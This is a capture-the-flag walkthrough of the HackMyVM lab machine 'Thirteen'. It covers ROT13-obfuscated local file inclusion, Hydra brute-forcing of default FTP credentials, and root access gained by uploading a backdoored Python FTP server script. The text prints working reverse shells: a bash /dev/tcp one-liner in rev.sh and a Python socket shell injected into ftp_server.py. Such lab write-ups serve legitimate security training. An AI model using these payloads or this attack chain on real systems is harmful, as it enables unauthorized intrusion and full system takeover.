# Thirteen

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Thirteen | sublarge | Beginner | HackMyVM |

**Summary:** Thirteen is a beginner-level Linux machine that exploits ROT13 encoding vulnerabilities and FTP server misconfigurations to achieve root access. The attack path begins with discovering a web application titled "iCloud Vault Access" that uses ROT13 encoding for file path obfuscation, enabling Local File Inclusion (LFI) to read system files including `/etc/passwd`. Enumeration reveals an FTP service using default credentials, which can be brute-forced using standard wordlists. Upon accessing the FTP server with elevated privileges, a Python-based FTP server script is discovered running as root. By uploading a modified version of this script with an embedded reverse shell, the attacker triggers remote code execution upon FTP service restart, immediately obtaining a root shell without requiring privilege escalation. Both user and root flags are captured in a single session.

---

## Reconnaissance

### Network Discovery

The initial network scan identifies the target machine on the local subnet:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.89 08:00:27:D3:18:4A VirtualBox
```

Target IP confirmed: **192.168.100.89**

### Port Scanning

A comprehensive Nmap scan reveals three open ports:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ nmap -sC -sV -p- -T4 192.168.100.89
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 18:51 WIB
Nmap scan report for 192.168.100.89
Host is up (0.0031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 2.0.1
| ftp-syst:
|   STAT:
| FTP server status:
|  Connected to: 192.168.100.89:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: iCloud Vault Access
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.10 seconds
```

**Key Findings:**
- **Port 21/tcp**: pyftpdlib 2.0.1 (Python FTP server)
- **Port 22/tcp**: OpenSSH 8.4p1 Debian 5+deb11u3
- **Port 80/tcp**: Apache httpd 2.4.62 with page title "iCloud Vault Access"

---

## Web Application Analysis

### Initial Web Enumeration

Accessing port 80 reveals an "iCloud Secure Vault" interface themed around iPhone 13 Pro Max:

![](image.png)

The web interface presents three file access buttons: "Welcome List", "Sync Config", and "Help Manual". Inspecting the page source reveals ROT13-encoded file paths:

```bash
...
        <div>
            <a href="?theme=jrypbzr.gkg" class="file-btn">📄 Welcome List</a>
            <a href="?theme=pbasvt.gkg" class="file-btn">🔧 Sync Config</a>
            <a href="?theme=ernqzr.gkg" class="file-btn">📘 Help Manual</a>
        </div>
...
```

### ROT13 Decoding Analysis

Given the machine name "Thirteen" and the encoded parameters, ROT13 cipher is suspected. Creating a shell alias for quick decoding:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m' <<<"
```

Decoding the discovered file paths:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ rot13 jrypbzr.gkg
welcome.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ rot13 pbasvt.gkg
config.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ rot13 ernqzr.gkg
readme.txt
```

### File Content Retrieval

Accessing each discovered file via the `theme` parameter:

**Welcome List (welcome.txt):**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ curl http://192.168.100.89/?theme=jrypbzr.gkg
<pre style='background: #1a1a1a; color: #00ff00; padding: 20px; border-radius: 8px; max-height: 400px; overflow-y: auto;'>Abdikarím
Shire
Gullét
Ibráhim
Dalmar
Sharmáke
Suléman
Rahim
Farhan
Feisal
Féysal
Ellyas
Sonári
Kadér
Zakaria
Adam
Mahad
Said
Maslah
Bille
Max
Sadiq
Dáhir
Warsamé
Jamać
</pre>
```

**Sync Config (config.txt):**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ curl http://192.168.100.89/?theme=pbasvt.gkg
<pre style='background: #1a1a1a; color: #00ff00; padding: 20px; border-radius: 8px; max-height: 400px; overflow-y: auto;'># FTP File System Configuration
# Config File - Do NOT delete

Version: 1.0.0

Default Credential: *****:*****

[Settings]
EnableAnonymous = false
PassiveMode = true
RootDirectory = /path/to/ftp/

[Security]
TLS = disabled
AllowUnencryptedLogin = true
MaxAuthTries = 5

[Logging]
LogFile = /path/to/ftp.log
LogLevel = INFO

# TODO: Replace default credential before deployment

</pre>
```

**Help Manual (readme.txt):**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ curl http://192.168.100.89/?theme=ernqzr.gkg
<pre style='background: #1a1a1a; color: #00ff00; padding: 20px; border-radius: 8px; max-height: 400px; overflow-y: auto;'>This tool is for ADMIN only!
Use the encrypted path input to explore hidden files!
</pre>
```

The readme indicates that the `theme` parameter accepts "encrypted" (ROT13) paths for arbitrary file access.

---

## Exploitation - Local File Inclusion via ROT13

### Testing LFI Vulnerability

Testing the vulnerability by reading `/etc/passwd`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ rot13 /etc/passwd
/rgp/cnffjq

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ curl http://192.168.100.89/?theme=/rgp/cnffjq
<pre style='background: #1a1a1a; color: #00ff00; padding: 20px; border-radius: 8px; max-height: 400px; overflow-y: auto;'>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
max:x:1001:1001::/home/max:/bin/bash
</pre>
```

**Identified Users:**
- `welcome` (UID 1000)
- `max` (UID 1001)

### Directory Bruteforcing with ROT13-Encoded Wordlist

Creating a ROT13-encoded wordlist from SecLists:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' > wordlist_rot13.txt
```

Fuzzing for hidden files/directories using FFUF:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ ffuf -u "http://192.168.100.89/?theme=FUZZ" -w wordlist_rot13.txt -fs 3444                                   
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.89/?theme=FUZZ
 :: Wordlist         : FUZZ: /tmp/thirteen/wordlist_rot13.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3444
________________________________________________

ybtf                    [Status: 200, Size: 129, Words: 13, Lines: 2, Duration: 11ms]
vaqrk.cuc               [Status: 200, Size: 38410480, Words: 3778081, Lines: 1, Duration: 2708ms]
:: Progress: [4750/4750] :: Job [1/1] :: 104 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ rot13 ybtf
logs

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ rot13 vaqrk.cuc
index.php
```

Additional endpoints discovered: `logs` and `index.php` (both non-actionable).

---

## Initial Access - FTP Credential Bruteforce

### FTP Authentication Attack

Based on the config.txt hint about default credentials, launching Hydra with a default FTP credentials wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.100.89 -I -u -f -e nsr -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-06 19:47:10
[DATA] max 64 tasks per 1 server, overall 64 tasks, 264 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.100.89:21/
[21][ftp] host: 192.168.100.89   login: ADMIN   password: 1[REDACTED]
[STATUS] attack finished for 192.168.100.89 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-06 19:47:14
```

**Credentials Obtained:** `ADMIN:1[REDACTED]`

### FTP Server Enumeration

Connecting to the FTP server and downloading available files:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ ftp 192.168.100.89
Connected to 192.168.100.89.
220 pyftpdlib 2.0.1 ready.
Name (192.168.100.89:ouba): ADMIN
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering extended passive mode (|||52629|).
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root         1607 Jul 05  2025 ftp_server.py
-rw-r--r--   1 root     root           54 Jul 05  2025 rev.sh
226 Transfer complete.
ftp> mget ftp_server.py
mget ftp_server.py [anpqy?]? y
229 Entering extended passive mode (|||47001|).
125 Data connection already open. Transfer starting.
100% |********************************************************|  1607      595.79 KiB/s    00:00 ETA
226 Transfer complete.
1607 bytes received in 00:00 (476.42 KiB/s)
ftp> get rev.sh
local: rev.sh remote: rev.sh
229 Entering extended passive mode (|||54071|).
150 File status okay. About to open data connection.
100% |********************************************************|    54       49.60 KiB/s    00:00 ETA
226 Transfer complete.
54 bytes received in 00:00 (32.77 KiB/s)
ftp> bye
221 Goodbye.
```

**Critical Discovery:** Files are owned by `root`, indicating the FTP server is running with root privileges.

### Analyzing Downloaded Files

**ftp_server.py:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ cat ftp_server.py
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from pyftpdlib.authorizers import DummyAuthorizer
import logging
import os

LOG_DIR = "/var/www/html/logs"
LOG_FILE = os.path.join(LOG_DIR, "ftp_server.log")

os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class CustomFTPHandler(FTPHandler):
    def on_connect(self):
        logging.info(f"Connection from {self.remote_ip}:{self.remote_port}")

    def on_disconnect(self):
        logging.info(f"Disconnected {self.remote_ip}:{self.remote_port}")

    def on_login(self, username):
        logging.info(f"User logged in: {username}")

    def on_logout(self, username):
        logging.info(f"User logged out: {username}")

    def on_file_sent(self, file):
        logging.info(f"File sent: {file}")

    def on_file_received(self, file):
        logging.info(f"File received: {file}")

    def on_incomplete_file_sent(self, file):
        logging.warning(f"Incomplete file sent: {file}")

    def on_incomplete_file_received(self, file):
        logging.warning(f"Incomplete file received: {file}")

def main():
    authorizer = DummyAuthorizer()
    authorizer.add_user("ADMIN", "1[REDACTED]", ".", perm="elradfmw")

    handler = CustomFTPHandler
    handler.authorizer = authorizer

    address = ("0.0.0.0", 21)
    server = FTPServer(address, handler)

    print(f"Starting FTP server on {address[0]}:{address[1]}, logging to {LOG_FILE}")
    server.serve_forever()

if __name__ == "__main__":
    main()
```

**rev.sh:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ cat rev.sh
#!/bin/bash
bash -i >& /dev/tcp/10.132.0.74/4444 0>&1
```

**Attack Vector Identified:** Since the FTP server runs as root and the ADMIN user has write permissions (`perm="elradfmw"`), uploading a modified `ftp_server.py` with an embedded reverse shell will grant immediate root access upon service restart.

---

## Privilege Escalation to Root

### Crafting the Malicious FTP Server Script

Creating a modified `ftp_server.py` with an embedded reverse shell that spawns when the server starts:

```python
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from pyftpdlib.authorizers import DummyAuthorizer
import logging
import os
import subprocess
import threading
import socket

LOG_DIR = "/var/www/html/logs"
LOG_FILE = os.path.join(LOG_DIR, "ftp_server.log")
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def spawn_reverse_shell():
    try:
        import pty
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.100.1", 4444))

        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        os.putenv("HISTFILE", '/dev/null')

        pty.spawn("/bin/bash")
        s.close()

    except ImportError:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.100.1", 4444))
        subprocess.call(["/bin/bash", "-i"],
                       stdin=s.fileno(),
                       stdout=s.fileno(),
                       stderr=s.fileno())
    except Exception as e:
        logging.error(f"Reverse shell failed: {e}")

class CustomFTPHandler(FTPHandler):
    def on_connect(self):
        logging.info(f"Connection from {self.remote_ip}:{self.remote_port}")

    def on_disconnect(self):
        logging.info(f"Disconnected {self.remote_ip}:{self.remote_port}")

    def on_login(self, username):
        logging.info(f"User logged in: {username}")

    def on_logout(self, username):
        logging.info(f"User logged out: {username}")

    def on_file_sent(self, file):
        logging.info(f"File sent: {file}")

    def on_file_received(self, file):
        logging.info(f"File received: {file}")

    def on_incomplete_file_sent(self, file):
        logging.warning(f"Incomplete file sent: {file}")

    def on_incomplete_file_received(self, file):
        logging.warning(f"Incomplete file received: {file}")

def main():
    logging.critical("FTP Server starting")
    threading.Thread(target=spawn_reverse_shell, daemon=True).start()

    authorizer = DummyAuthorizer()
    authorizer.add_user("ADMIN", "1[REDACTED]", ".", perm="elradfmw")

    handler = CustomFTPHandler
    handler.authorizer = authorizer

    address = ("0.0.0.0", 21)
    server = FTPServer(address, handler)

    print(f"Starting FTP server on {address[0]}:{address[1]}")
    server.serve_forever()

if __name__ == "__main__":
    main()
```

### Uploading the Weaponized Script

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ ftp 192.168.100.89
Connected to 192.168.100.89.
220 pyftpdlib 2.0.1 ready.
Name (192.168.100.89:ouba): ADMIN
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put ftp_server.py
local: ftp_server.py remote: ftp_server.py
229 Entering extended passive mode (|||37319|).
150 File status okay. About to open data connection.
100% |******************************|  2507       23.90 MiB/s    00:00 ETA
226 Transfer complete.
2507 bytes sent in 00:00 (273.91 KiB/s)
ftp> bye
221 Goodbye.
```

### Triggering the Reverse Shell

Setting up a netcat listener:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

After restarting the target VM via VirtualBox, the reverse shell connects:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59744
root@13max:/opt# id
id
uid=0(root) gid=0(root) groups=0(root)
root@13max:/opt# ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/thirteen]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

root@13max:/opt#
```

**Root shell obtained!**

---

## Flag Capture

### Retrieving Both Flags

```bash
root@13max:/opt# id ; whoami ; hostname
uid=0(root) gid=0(root) groups=0(root)
root
13max
root@13max:/opt# cat /root/root.flag
flag{root-[REDACTED]}
root@13max:/opt# cat /home/welcome/user.flag
flag{user-[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Conducted network scanning identifying VirtualBox VM at 192.168.100.89 with open ports 21 (pyftpdlib), 22 (SSH), and 80 (Apache). Web application titled "iCloud Vault Access" discovered on port 80.

2. **Vulnerability Discovery**: Analyzed web application revealing ROT13 encoding scheme for file paths. Identified Local File Inclusion (LFI) vulnerability via `theme` parameter allowing arbitrary file read when paths are ROT13-encoded. Successfully read `/etc/passwd` to enumerate users `welcome` and `max`.

3. **Credential Acquisition**: Discovered FTP configuration file hinting at default credentials. Performed successful credential brute-force attack against FTP service using Hydra with default credentials wordlist, obtaining `ADMIN:1[REDACTED]`.

4. **FTP Enumeration**: Connected to FTP server and discovered `ftp_server.py` and `rev.sh` owned by root user, indicating FTP service runs with root privileges. Analyzed Python script confirming ADMIN user has full write permissions (`elradfmw`).

5. **Exploitation & Root Access**: Modified `ftp_server.py` to include a reverse shell payload that executes upon server initialization. Uploaded weaponized script via FTP. Triggered reverse shell by restarting target VM, immediately obtaining root shell without requiring traditional privilege escalation. Captured both user and root flags in single session.
